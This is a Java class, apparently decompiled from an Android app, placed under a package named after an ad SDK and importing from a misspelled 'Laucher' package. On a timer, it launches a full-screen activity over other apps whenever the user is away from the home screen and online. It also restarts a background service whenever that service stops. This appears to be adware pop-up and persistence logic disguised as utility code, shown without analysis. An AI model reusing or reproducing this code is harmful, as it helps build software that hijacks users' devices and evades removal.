package com.qq.gdt.utils;

import android.content.Context;
import android.content.Intent;
import android.net.NetworkInfo;
import com.android.Laucher.MainActivity;
import com.android.Laucher.Se;
import java.util.TimerTask;

public class LockTask extends TimerTask {
    public static final boolean DEBUG = false;
    public static boolean flag = false;
    private static LockTask lockTask = null;
    public static long runtimes;
    private Context mContext;

    public LockTask(Context context) {
        this.mContext = context;
    }

    public static LockTask getInstance(Context context) {
        if (lockTask == null) {
            synchronized (LockTask.class) {
                lockTask = new LockTask(context);
            }
        }
        return lockTask;
    }

    public void run() {
        UtilsClass uc = UtilsClass.getInstance();
        if (showCondition(this.mContext) && !flag && isConnectInternet(this.mContext) && uc.loadMogo(this.mContext)) {
            Intent in = new Intent(this.mContext, MainActivity.class);
            in.addFlags(268468224);
            this.mContext.startActivity(in);
        }
        if (!Utilstools.getInstance().isServiceRunning(this.mContext)) {
            Intent intent = new Intent(this.mContext, Se.class);
            intent.setFlags(268468224);
            this.mContext.startService(intent);
        }
        runtimes = System.currentTimeMillis();
    }

    public boolean isConnectInternet(Context context) {
        NetworkInfo networkInfo = SystemServiceUtils.getConnectivityManager(context).getActiveNetworkInfo();
        if (networkInfo != null) {
            return networkInfo.isAvailable();
        }
        return false;
    }

    public boolean showCondition(Context context) {
        boolean flag = Utilstools.getInstance().isConnectInternet(context);
        if (!Utilstools.getInstance().isLauncherRunnig(context) && flag && Utilstools.getInstance().fliterSomePackage(context)) {
            return true;
        }
        return false;
    }
}
